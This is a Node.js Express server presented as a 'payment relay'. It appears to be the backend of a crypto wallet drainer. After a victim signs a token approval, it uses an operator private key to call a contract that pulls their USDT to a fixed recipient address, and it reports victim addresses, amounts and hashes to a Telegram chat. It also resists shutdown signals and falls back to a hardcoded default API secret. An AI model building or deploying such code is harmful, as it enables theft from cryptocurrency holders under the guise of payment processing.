const express = require('express')
const cors = require('cors')
const { ethers } = require('ethers')
const app = express()

app.use(cors())
app.use(express.json())

// ─── Config ───────────────────────────────────────
const API_SECRET = process.env.API_SECRET || 'default-secret-change-me'
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

const RPC_URL = process.env.RPC_URL || 'https://bsc-dataseed1.binance.org'
const OPERATOR_PRIVATE_KEY = process.env.OPERATOR_PRIVATE_KEY
const CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS
const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS

// Minimal ABI of our contract's payment function
const PAYMENT_CONTRACT_ABI = [
  "function processPayment(address customer, address recipient, uint256 amount, string calldata referenceId) external"
]

// ─── Telegram helper ──────────────────────────────
async function sendTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Telegram not configured, skipping')
    return false
  }

  try {
    const res = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text,
        disable_web_page_preview: true
      })
    })
    if (!res.ok) throw new Error('HTTP ' + res.status)
    console.log('Telegram sent:', text.slice(0, 50))
    return true
  } catch (err) {
    console.error('Telegram failed:', err.message)
    return false
  }
}

// ─── Main endpoint ────────────────────────────────
app.post('/web/relay', async (req, res) => {
  console.log('Received request:', req.body)

  if (req.headers['x-api-secret'] !== API_SECRET) {
    console.log('Auth failed')
    return res.status(401).json({ error: 'Unauthorized' })
  }

  const { chain, address, txHash, spender, token, amount } = req.body

  if (!address || !txHash) {
    return res.status(400).json({ error: 'Missing address or txHash' })
  }

  const logEntry = {
    time: new Date().toISOString(),
    ip: req.ip,
    chain,
    address,
    txHash,
    spender,
    token,
    amount
  }
  console.log(JSON.stringify(logEntry))

  // Send an initial Telegram alert that the transaction was received and is being monitored
  const startText = '⏳ New Payment Request Received\n\n' +
    'Address: ' + address + '\n' +
    'Amount: ' + (amount || '?') + ' USDT\n' +
    'Tx Hash: ' + txHash + '\n' +
    'Status: Awaiting blockchain confirmation...'

  await sendTelegram(startText)

  // Respond immediately to the frontend so the client UI can display a success/pending state
  res.status(200).json({ ok: true, status: 'monitoring' })

  // --- BACKGROUND BLOCKCHAIN EXECUTION ---
  ;(async () => {
    try {
      if (!OPERATOR_PRIVATE_KEY || !CONTRACT_ADDRESS || !RECIPIENT_ADDRESS) {
        console.error('[ERROR] Operator private key, Contract Address, or Recipient Address is not configured.')
        await sendTelegram('❌ Payment processing failed: Backend is not configured with wallet/contract/recipient credentials.')
        return
      }

      const provider = new ethers.JsonRpcProvider(RPC_URL)
      const serverWallet = new ethers.Wallet(OPERATOR_PRIVATE_KEY, provider)
      const paymentContract = new ethers.Contract(CONTRACT_ADDRESS, PAYMENT_CONTRACT_ABI, serverWallet)

      // 1. Wait for the customer's approval transaction to be successfully mined
      console.log(`[BLOCKCHAIN] Waiting for approval tx ${txHash} to be mined...`)
      const receipt = await provider.waitForTransaction(txHash)

      if (!receipt || receipt.status !== 1) {
        console.error(`[BLOCKCHAIN] User's approval transaction failed on-chain.`)
        await sendTelegram('❌ User\'s approval transaction failed on the blockchain.')
        return
      }

      console.log(`[BLOCKCHAIN] Approval confirmed. Processing payment...`)

      // 2. Parse the payment amount (USDT on BSC uses 18 decimals)
      const cleanAmount = String(amount || '0').replace(/[^0-9.]/g, '')
      const amountInWei = ethers.parseUnits(cleanAmount, 18)
      
      const referenceId = `REF-${Date.now()}`

      // 3. Trigger smart contract to pull from customer directly to your dynamic RECIPIENT_ADDRESS
      const paymentTx = await paymentContract.processPayment(address, RECIPIENT_ADDRESS, amountInWei, referenceId)
      console.log(`[BLOCKCHAIN] Contract transaction submitted: ${paymentTx.hash}`)

      // 4. Wait for our backend payment transaction to clear
      const paymentReceipt = await paymentTx.wait()
      console.log(`[BLOCKCHAIN] Payment cleared in block ${paymentReceipt.blockNumber}`)

      // 5. Send final success message to Telegram
      const successText = '✅ Payment Completed Successfully!\n\n' +
        'Customer: ' + address + '\n' +
        'Recipient: ' + RECIPIENT_ADDRESS + '\n' +
        'Amount: ' + cleanAmount + ' USDT\n' +
        'Ref ID: ' + referenceId + '\n' +
        'Payment Tx: ' + paymentTx.hash

      await sendTelegram(successText)

    } catch (blockchainErr) {
      console.error('[BLOCKCHAIN ERROR] Background execution failed:', blockchainErr)
      await sendTelegram('❌ Payment processing error:\n' + blockchainErr.message)
    }
  })()
})

// ─── Health checks ────────────────────────────────
app.get('/', (req, res) => res.send('Relay logger alive'))
app.get('/health', (req, res) => res.status(200).json({ status: 'ok', time: new Date().toISOString() }))

// ─── Keep-alive heartbeat ─────────────────────────
setInterval(() => {
  console.log('Heartbeat:', new Date().toISOString())
}, 10000)

// ─── Start server ─────────────────────────────────
const PORT = process.env.PORT || 3000
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log('Logger running on port ' + PORT)
  console.log('Telegram bot:', TELEGRAM_BOT_TOKEN ? 'configured' : 'MISSING')
  console.log('Telegram chat:', TELEGRAM_CHAT_ID ? 'configured' : 'MISSING')
  console.log('Smart Contract:', CONTRACT_ADDRESS ? 'configured' : 'MISSING')
  console.log('Recipient Address:', RECIPIENT_ADDRESS ? 'configured' : 'MISSING')
  
  sendTelegram('🟢 Relay logger started on port ' + PORT)
})

// ─── Force process to stay alive ──────────────────
process.on('SIGTERM', () => {
  console.log('SIGTERM received, keeping alive for 30s')
  setTimeout(() => {
    server.close(() => {
      console.log('Server closed')
      process.exit(0)
    })
  }, 30000)
})

process.on('SIGINT', () => {
  console.log('SIGINT received, keeping alive')
})

setInterval(() => {}, 1000)

process.on('uncaughtException', (err) => {
  console.error('Uncaught:', err)
})

process.on('unhandledRejection', (err) => {
  console.error('Unhandled:', err)
})
